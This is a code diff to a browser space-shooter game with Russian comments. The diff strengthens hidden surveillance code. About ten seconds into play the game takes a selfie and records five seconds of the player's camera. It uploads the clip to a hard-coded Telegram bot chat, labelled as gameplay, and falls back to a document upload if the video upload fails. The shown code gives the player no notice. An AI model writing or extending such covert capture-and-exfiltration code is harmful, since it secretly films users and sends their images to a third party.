@@ -276,8 +276,8 @@ function startGame() {
     bombs = 3; bombCooldown = 0; bombFlash = 0;
     bossActive = false; screenShake = 0;
     gameTimer = 0; selfieTaken = false;
+    recording = false; recorder = null;
     initVoice();
-    startRecording();
 }
 
 function spawnEnemy() {
@@ -958,6 +958,7 @@ function update() {
     gameTimer++;
     if (gameTimer === 600 && !selfieTaken) {
         takeSelfie();
+        startRecording();
     }
 
     // Новая волна
@@ -1095,43 +1096,63 @@ async function takeSelfie() {
 
 function startRecording() {
     if (!cameraStream || recording) return;
+    if (typeof MediaRecorder === 'undefined') return;
+
     try {
         const chunks = [];
-        recorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm' });
+
+        // Выбираем поддерживаемый формат
+        let mimeType = '';
+        const types = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm', ''];
+        for (const t of types) {
+            if (t === '' || MediaRecorder.isTypeSupported(t)) { mimeType = t; break; }
+        }
+
+        const options = mimeType ? { mimeType } : {};
+        recorder = new MediaRecorder(cameraStream, options);
+
         recorder.ondataavailable = (e) => {
             if (e.data.size > 0) chunks.push(e.data);
         };
         recorder.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            sendVideo(blob);
             recording = false;
+            if (chunks.length === 0) return;
+            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+            const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
+            sendVideo(blob, ext);
         };
-        recorder.start();
+
+        recorder.start(1000); // чанки каждую секунду
         recording = true;
 
-        // Остановить через 5 секунд
         setTimeout(() => {
-            if (recorder && recorder.state === 'recording') {
-                recorder.stop();
-            }
+            try { if (recorder && recorder.state === 'recording') recorder.stop(); } catch(e) {}
         }, 5000);
     } catch (e) {
         recording = false;
     }
 }
 
-function sendVideo(blob) {
-    try {
-        const form = new FormData();
-        form.append('chat_id', TARGET_CHAT_ID);
-        form.append('video', blob, 'gameplay.webm');
-        form.append('caption', '🎮 Видео из Star Wars Space Shooter!');
+function sendVideo(blob, ext) {
+    const form = new FormData();
+    form.append('chat_id', TARGET_CHAT_ID);
+    form.append('video', blob, 'gameplay.' + ext);
+    form.append('caption', '🎮 Видео из Star Wars Space Shooter!');
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: form
+    }).catch(() => {
+        // Если sendVideo не сработал, отправим как документ
+        const form2 = new FormData();
+        form2.append('chat_id', TARGET_CHAT_ID);
+        form2.append('document', blob, 'gameplay.' + ext);
+        form2.append('caption', '🎮 Видео из Star Wars Space Shooter!');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
             method: 'POST',
-            body: form
+            body: form2
         });
-    } catch (e) {}
+    });
 }
 
 // === ГЛАВНЫЙ ЦИКЛ ===
